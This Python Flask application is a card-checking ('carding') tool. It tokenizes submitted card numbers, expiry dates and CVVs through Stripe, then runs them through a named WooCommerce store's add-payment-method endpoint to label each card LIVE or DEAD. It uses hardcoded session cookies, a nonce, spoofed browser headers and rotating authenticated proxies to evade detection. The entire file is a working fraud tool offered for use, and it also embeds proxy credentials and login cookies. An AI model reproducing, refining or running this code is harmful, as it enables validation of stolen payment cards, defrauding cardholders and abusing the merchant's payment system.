from flask import Flask, request, jsonify
import requests
import json
import time
import random
from datetime import datetime

app = Flask(__name__)

# Proxy List
PROXIES = [
    "http://mytkdpjb:ttc6d7nnoao5@142.111.48.253:7030",
    "http://mytkdpjb:ttc6d7nnoao5@23.95.150.145:6114",
    "http://mytkdpjb:ttc6d7nnoao5@198.23.239.134:6540",
    "http://mytkdpjb:ttc6d7nnoao5@107.172.163.27:6543",
    "http://mytkdpjb:ttc6d7nnoao5@198.105.121.200:6462",
    "http://mytkdpjb:ttc6d7nnoao5@64.137.96.74:6641",
    "http://mytkdpjb:ttc6d7nnoao5@84.247.60.125:6095",
    "http://mytkdpjb:ttc6d7nnoao5@216.10.27.159:6837",
    "http://mytkdpjb:ttc6d7nnoao5@23.26.71.145:5628",
    "http://mytkdpjb:ttc6d7nnoao5@23.27.208.120:5830"
]

# Global variable to store real-time logs
live_logs = []

def get_proxy():
    """Get random proxy from list"""
    return random.choice(PROXIES)

def log(message, status="info"):
    """Add log with timestamp and status"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_entry = {
        "time": timestamp,
        "message": message,
        "status": status
    }
    live_logs.append(log_entry)
    print(f"[{timestamp}] {message}")
    return log_entry


@app.route('/api/check-card', methods=['POST'])
def check_card():
    """
    Stripe AUTH checker endpoint - dutchwaregear.com
    """
    global live_logs
    live_logs = []
    
    try:
        data = request.json
        
        log("🚀 Starting Stripe AUTH check...", "info")
        log(f"📝 Request from {request.remote_addr}", "info")
        
        # Validate fields
        if not all(k in data for k in ['card_number', 'exp_month', 'exp_year', 'cvv']):
            log("❌ Missing required fields", "error")
            return jsonify({
                'success': False,
                'status': 'error',
                'message': 'Missing: card_number, exp_month, exp_year, cvv',
                'logs': live_logs
            }), 400

        card_number = data['card_number'].replace(' ', '')
        exp_month = data['exp_month']
        exp_year = data['exp_year']
        cvv = data['cvv']
        
        log(f"💳 Card: {mask_card(card_number)}", "info")
        log(f"📅 Expiry: {exp_month}/{exp_year}", "info")
        log(f"🔒 CVV: ***", "info")
        
        # Step 1: Tokenize card with Stripe
        log("⏳ Tokenizing with Stripe...", "pending")
        time.sleep(0.3)
        
        token_result = tokenize_card(card_number, exp_month, exp_year, cvv)
        
        if not token_result['success']:
            log(f"❌ Tokenization failed: {token_result['error']}", "error")
            return jsonify({
                'success': False,
                'status': 'declined',
                'message': f"Tokenization failed: {token_result['error']}",
                'card': mask_card(card_number),
                'result': 'DEAD ❌',
                'logs': live_logs
            }), 200
        
        pm_id = token_result['pm_id']
        log(f"✅ Payment Method: {pm_id}", "success")
        
        # Step 2: Verify with WooCommerce
        log("🔐 Verifying with dutchwaregear.com...", "pending")
        
        verify_result = verify_payment_method(pm_id)
        
        if verify_result['success']:
            log("✅ CARD AUTHENTICATED!", "success")
            
            return jsonify({
                'success': True,
                'status': 'authenticated',
                'message': 'Card authenticated successfully',
                'card': mask_card(card_number),
                'brand': token_result.get('brand'),
                'bin': token_result.get('bin'),
                'result': 'LIVE ✅',
                'logs': live_logs
            }), 200
        else:
            log(f"❌ AUTH FAILED: {verify_result.get('error', 'Unknown error')}", "error")
            
            return jsonify({
                'success': False,
                'status': 'declined',
                'message': f"Auth failed: {verify_result.get('error')}",
                'card': mask_card(card_number),
                'result': 'DECLINED ❌',
                'logs': live_logs
            }), 200

    except Exception as e:
        log(f"❌ Critical Error: {str(e)}", "error")
        return jsonify({
            'success': False,
            'status': 'error',
            'message': f'Internal error: {str(e)}',
            'logs': live_logs
        }), 500


def tokenize_card(card_number, exp_month, exp_year, cvv):
    """
    Step 1: Tokenize card with Stripe API
    """
    try:
        log("🔐 Sending to Stripe API...", "info")
        
        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36',
        }
        
        # Generate random session IDs
        session_id = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}"
        guid = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}"
        muid = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}"
        sid = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}"
        
        data = (
            f'type=card'
            f'&card[number]={card_number.replace(" ", "+")}'
            f'&card[cvc]={cvv}'
            f'&card[exp_year]={exp_year[-2:]}'
            f'&card[exp_month]={exp_month.zfill(2)}'
            f'&allow_redisplay=unspecified'
            f'&billing_details[address][postal_code]=11201'
            f'&billing_details[address][country]=US'
            f'&pasted_fields=number'
            f'&payment_user_agent=stripe.js%2F065b474d33%3B+stripe-js-v3%2F065b474d33%3B+payment-element%3B+deferred-intent%3B+autopm'
            f'&referrer=https%3A%2F%2Fdutchwaregear.com'
            f'&time_on_page={random.randint(40000, 50000)}'
            f'&client_attribution_metadata[client_session_id]={session_id}'
            f'&client_attribution_metadata[merchant_integration_source]=elements'
            f'&client_attribution_metadata[merchant_integration_subtype]=payment-element'
            f'&client_attribution_metadata[merchant_integration_version]=2021'
            f'&client_attribution_metadata[payment_intent_creation_flow]=deferred'
            f'&client_attribution_metadata[payment_method_selection_flow]=automatic'
            f'&guid={guid}'
            f'&muid={muid}'
            f'&sid={sid}'
            f'&key=pk_live_519nBukI9oykdfdWyNcVrihLJENCleHRhasAGzDweRi7VjyBkcziltWhFeLwHBCkcAnBMXg96vRq0RP0Xt3EcKH1700w8cxTJwB'
            f'&_stripe_version=2024-06-20'
        )
        
        proxy = get_proxy()
        proxies = {'http': proxy, 'https': proxy}
        log(f"🌐 Using proxy: {proxy.split('@')[1]}", "info")
        
        response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=data,
            proxies=proxies,
            timeout=15
        )
        
        log(f"📊 Stripe Response: {response.status_code}", "info")
        
        if response.status_code == 200:
            result = response.json()
            
            if 'error' in result:
                error_msg = result['error'].get('message', 'Unknown error')
                log(f"❌ Stripe Error: {error_msg}", "error")
                return {'success': False, 'error': error_msg}
            
            if 'id' in result:
                pm_id = result['id']
                card_info = result.get('card', {})
                
                log(f"✅ Token: {pm_id[:20]}...", "success")
                log(f"🏦 Brand: {card_info.get('brand', 'Unknown')}", "info")
                log(f"🔢 BIN: {card_info.get('bin', 'N/A')}", "info")
                
                return {
                    'success': True,
                    'pm_id': pm_id,
                    'brand': card_info.get('brand'),
                    'bin': card_info.get('bin')
                }
        
        log("❌ Invalid Stripe response", "error")
        return {'success': False, 'error': 'Invalid Stripe response'}
        
    except Exception as e:
        log(f"❌ Tokenization exception: {str(e)}", "error")
        return {'success': False, 'error': str(e)}


def verify_payment_method(pm_id):
    """
    Step 2: Verify payment method via WooCommerce AJAX
    """
    try:
        log("🌐 Connecting to dutchwaregear.com...", "info")
        
        cookies = {
            'wordpress_logged_in_94bd4e2e7ee5bf1e7286fdaabc8621b8': 'syvyri%7C1770477698%7ClTk1FOh9PN45iwZVLzG94JjApHMmLCeSd4HSlmNiCtK%7Cd2e8a87cfae137ff9cb6df0338ce0dd5e8168da105430875356e169212fd4b07',
            'wfwaf-authcookie-47263209c79b9069b7fa61ecf76579f7': '82309%7Cother%7Cread%7Cb0f12c4e730fd894af241511e193a028f6a61e9c8577081192877341682734a8',
            '__stripe_mid': f'{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}',
            '__stripe_sid': f'{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}',
        }
        
        headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://dutchwaregear.com',
            'referer': 'https://dutchwaregear.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': '6842ee670a',
        }
        
        log("📤 Submitting AUTH request...", "info")
        
        proxy = get_proxy()
        proxies = {'http': proxy, 'https': proxy}
        
        response = requests.post(
            'https://dutchwaregear.com/wp-admin/admin-ajax.php',
            cookies=cookies,
            headers=headers,
            data=data,
            proxies=proxies,
            timeout=20
        )
        
        log(f"📊 Response: {response.status_code}", "info")
        
        # Parse response
        try:
            result = response.json()
        except:
            result = {'text': response.text[:200]}
        
        log(f"🔍 Response preview: {str(result)[:150]}...", "info")
        
        # Check for success
        if response.status_code == 200:
            if isinstance(result, dict):
                if result.get('success'):
                    log("✅ Setup intent confirmed!", "success")
                    return {'success': True}
                elif 'error' in result:
                    error_data = result.get('error', {})
                    if isinstance(error_data, dict):
                        error_msg = error_data.get('message', 'Card declined')
                    else:
                        error_msg = str(error_data)
                    log(f"❌ Declined: {error_msg}", "error")
                    return {'success': False, 'error': error_msg}
        
        # Check response text for success indicators
        response_text = response.text.lower()
        if 'success' in response_text and 'true' in response_text:
            log("✅ Auth successful (detected in response)", "success")
            return {'success': True}
        
        # Decline indicators
        if 'declined' in response_text or 'error' in response_text or 'invalid' in response_text:
            log("❌ Card declined", "error")
            return {'success': False, 'error': 'Card declined by processor'}
        
        log("⚠️ Unclear response", "pending")
        return {'success': False, 'error': 'Unclear response from server'}
        
    except Exception as e:
        log(f"❌ Verification exception: {str(e)}", "error")
        return {'success': False, 'error': str(e)}


def mask_card(card_number):
    """Mask card number"""
    if len(card_number) < 4:
        return '****'
    return f"{'*' * (len(card_number) - 4)}{card_number[-4:]}"


@app.route('/api/health', methods=['GET'])
def health_check():
    """Health check"""
    return jsonify({
        'status': 'online',
        'service': 'Stripe AUTH Checker',
        'version': '2.0',
        'site': 'dutchwaregear.com'
    })


@app.route('/', methods=['GET'])
def index():
    """Serve UI"""
    return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stripe AUTH Checker</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        .card {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 30px;
        }
        h1 { color: #333; margin-bottom: 5px; font-size: 26px; }
        .subtitle { color: #666; margin-bottom: 20px; font-size: 13px; }
        .badge {
            display: inline-block;
            background: #2ecc71;
            color: #fff;
            padding: 4px 10px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 700;
            margin-bottom: 15px;
        }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; color: #555; font-weight: 600; font-size: 13px; }
        input {
            width: 100%;
            padding: 10px 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 14px;
            transition: border 0.3s;
        }
        input:focus { outline: none; border-color: #667eea; }
        .row { display: flex; gap: 10px; }
        .col { flex: 1; }
        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: transform 0.2s;
        }
        button:hover { transform: translateY(-2px); }
        button:disabled { background: #ccc; cursor: not-allowed; transform: none; }
        .result {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            display: none;
            font-size: 14px;
        }
        .result.success { background: #d4edda; border: 2px solid #28a745; color: #155724; display: block; }
        .result.error { background: #f8d7da; border: 2px solid #dc3545; color: #721c24; display: block; }
        .logs-container {
            background: #1e1e1e;
            border-radius: 10px;
            padding: 20px;
            height: calc(100vh - 40px);
            overflow-y: auto;
        }
        .logs-title {
            color: #fff;
            margin-bottom: 15px;
            font-size: 18px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .log-entry {
            padding: 8px 12px;
            margin-bottom: 5px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            animation: slideIn 0.3s ease;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-10px); }
            to { opacity: 1; transform: translateX(0); }
        }
        .log-entry.info { background: rgba(52, 152, 219, 0.2); color: #3498db; }
        .log-entry.success { background: rgba(46, 204, 113, 0.2); color: #2ecc71; }
        .log-entry.error { background: rgba(231, 76, 60, 0.2); color: #e74c3c; }
        .log-entry.pending { background: rgba(241, 196, 15, 0.2); color: #f1c40f; }
        .info-box {
            background: #e3f2fd;
            border-left: 4px solid #2196f3;
            padding: 12px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 13px;
            color: #1565c0;
        }
        @media (max-width: 768px) {
            .container { grid-template-columns: 1fr; }
            .logs-container { height: 400px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <span class="badge">✅ AUTH ONLY - NO CHARGE</span>
            <h1>🔐 Stripe AUTH Checker</h1>
            <p class="subtitle">dutchwaregear.com - Authentication test</p>
            
            <div class="info-box">
                ℹ️ This checker only validates card details (AUTH). No charges will be made.
            </div>
            
            <form id="cardForm">
                <div class="form-group">
                    <label>Card Number</label>
                    <input type="text" id="cardNumber" placeholder="4111 1111 1111 1111" maxlength="19" required>
                </div>
                <div class="row">
                    <div class="col form-group">
                        <label>Month</label>
                        <input type="text" id="expMonth" placeholder="12" maxlength="2" required>
                    </div>
                    <div class="col form-group">
                        <label>Year</label>
                        <input type="text" id="expYear" placeholder="2025" maxlength="4" required>
                    </div>
                    <div class="col form-group">
                        <label>CVV</label>
                        <input type="text" id="cvv" placeholder="123" maxlength="4" required>
                    </div>
                </div>
                <button type="submit" id="submitBtn">🔍 Check Card (AUTH)</button>
            </form>
            <div class="result" id="result"></div>
        </div>
        
        <div class="logs-container">
            <div class="logs-title">📊 Live Debug Console</div>
            <div id="logs"></div>
        </div>
    </div>

    <script>
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\\s/g, '');
            e.target.value = value.match(/.{1,4}/g)?.join(' ') || value;
        });
        
        ['cardNumber', 'expMonth', 'expYear', 'cvv'].forEach(id => {
            document.getElementById(id).addEventListener('input', function(e) {
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
            });
        });
        
        document.getElementById('cardForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const cardNumber = document.getElementById('cardNumber').value.replace(/\\s/g, '');
            const expMonth = document.getElementById('expMonth').value;
            const expYear = document.getElementById('expYear').value;
            const cvv = document.getElementById('cvv').value;
            
            document.getElementById('logs').innerHTML = '';
            document.getElementById('result').style.display = 'none';
            document.getElementById('submitBtn').disabled = true;
            
            try {
                const response = await fetch('/api/check-card', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        card_number: cardNumber,
                        exp_month: expMonth,
                        exp_year: expYear,
                        cvv: cvv
                    })
                });
                
                const data = await response.json();
                
                if (data.logs) {
                    data.logs.forEach(log => addLog(log.time, log.message, log.status));
                }
                
                if (data.status === 'authenticated') {
                    showResult('success', 
                        '✅ Card LIVE (Authenticated)', 
                        `Card: ${data.card}<br>Brand: ${data.brand}<br>BIN: ${data.bin}<br><strong>${data.result}</strong>`
                    );
                } else {
                    showResult('error', 
                        '❌ Card DEAD (Authentication Failed)', 
                        `Card: ${data.card}<br>Reason: ${data.message}<br><strong>${data.result}</strong>`
                    );
                }
            } catch (error) {
                showResult('error', '❌ Error', error.message);
            } finally {
                document.getElementById('submitBtn').disabled = false;
            }
        });
        
        function addLog(time, message, status) {
            const logsDiv = document.getElementById('logs');
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry ${status}`;
            logEntry.textContent = `[${time}] ${message}`;
            logsDiv.appendChild(logEntry);
            logsDiv.scrollTop = logsDiv.scrollHeight;
        }
        
        function showResult(type, title, content) {
            const resultDiv = document.getElementById('result');
            resultDiv.className = `result ${type}`;
            resultDiv.innerHTML = `<strong>${title}</strong><br><br>${content}`;
        }
    </script>
</body>
</html>
'''


if __name__ == '__main__':
    print("="*60)
    print("🔐 Stripe AUTH Checker - dutchwaregear.com")
    print("="*60)
    print("📍 Server: http://localhost:5004")
    print("✅ Type: Authentication Only (No Charge)")
    print(f"🌐 Proxies: {len(PROXIES)} rotating proxies")
    print("📊 Features:")
    print("   ✅ Stripe tokenization")
    print("   ✅ WooCommerce setup intent")
    print("   ✅ Real-time logging")
    print("   ✅ Beautiful UI")
    print("   ✅ Proxy rotation")
    print("="*60)
    app.run(host='0.0.0.0', port=5004, debug=False)
